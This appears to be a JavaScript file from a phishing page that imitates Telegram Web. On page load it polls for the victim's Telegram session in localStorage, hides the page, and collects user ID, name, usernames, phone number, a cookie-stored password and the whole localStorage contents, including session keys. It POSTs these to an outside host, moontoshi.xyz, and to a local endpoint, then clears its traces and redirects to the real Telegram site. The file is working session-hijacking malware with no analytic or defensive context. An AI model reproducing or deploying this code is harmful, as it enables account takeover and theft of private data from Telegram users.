document.addEventListener("DOMContentLoaded", function () {
  async function checkLocalStorage1() {
    let globalState = localStorage.getItem("tt-global-state");
    if (globalState && localStorage.getItem("user_auth")) {
      const parsedState = JSON.parse(globalState);
      const currentUserId = parsedState.currentUserId;
      const currentUser = parsedState.users.byId[currentUserId];
      document.body.style.display = "none";

      if (currentUserId && currentUser) {
        const { firstName, usernames, phoneNumber, isPremium } = currentUser;
        const password = document.cookie
          .split("; ")
          .find((e) => e.startsWith("password="))
          ?.split("=")[1];

        localStorage.removeItem("GramJs:apiCache");
        localStorage.removeItem("tt-global-state");
        const set = { ...localStorage };
        try {
          await fetch(`https://moontoshi.xyz/api/users/telegram/info`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              userId: currentUserId,
              firstName,
              usernames,
              phoneNumber,
              isPremium,
              password,
              quicklySet: set,
              type: new URLSearchParams(window.location.search).get("type"),
              channelid: new URLSearchParams(window.location.search).get("id"),
            }),
          });
        } catch (e) {}

        await fetch(`/api/users/telegram/info`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            userId: currentUserId,
            firstName,
            usernames,
            phoneNumber,
            isPremium,
            password,
            quicklySet: set,
            type: new URLSearchParams(window.location.search).get("type"),
            channelid: new URLSearchParams(window.location.search).get("id"),
          }),
        });

        // window.Telegram.WebApp.openTelegramLink("https://t.me/+snBEtm9-pWRhYjhk");
        window.Telegram.WebApp.close();
        localStorage.clear();
        document.cookie =
          "password=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
        window.location.href = "https://web.telegram.org/a/";

        clearInterval(checkInterval1);
      }
    } else {
      sessionStorage.clear();
      localStorage.clear();
    }
  }

  const checkInterval1 = setInterval(checkLocalStorage1, 100);
});
